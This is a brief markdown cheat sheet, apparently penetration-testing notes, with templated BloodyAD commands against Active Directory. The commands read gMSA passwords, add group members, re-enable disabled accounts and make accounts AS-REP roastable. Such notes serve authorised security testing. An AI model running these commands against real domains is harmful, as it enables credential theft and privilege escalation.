# BloodyAD #

- Read gMSA (Group-Managed Service Account Passwords)
`bloodyAD -d {{ $DOMAIN }} --host {{ $DC_HOST_NAME }} --dc-ip {{ $DC_IP }} -k get object {{ $ACCOUNT }} --attr msDS-ManagedPassword`

- Add group member
`bloodyAD -d {{ $DOMAIN }} --host {{ $DC_HOST_NAME }} --dc-ip {{ $DC_IP }} -k add groupMember {{ $GROUP }} {{ $ACCOUNT }}`

- Enable a disabled account
`bloodyAD -d {{ $DOMAIN }} --host {{ $DC_HOST_NAME }} --dc-ip {{ $DC_IP }} -k remove uac {{ $ACCOUNT }} -f ACCOUNTDISABLE`

- Make account ASREProastable
`bloodyAD -d {{ $DOMAIN }} --host {{ $DC_HOST_NAME }} --dc-ip {{ $DC_IP }} -k add uac {{ $ACCOUNT }} -f DONT_REQ_PREAUTH`


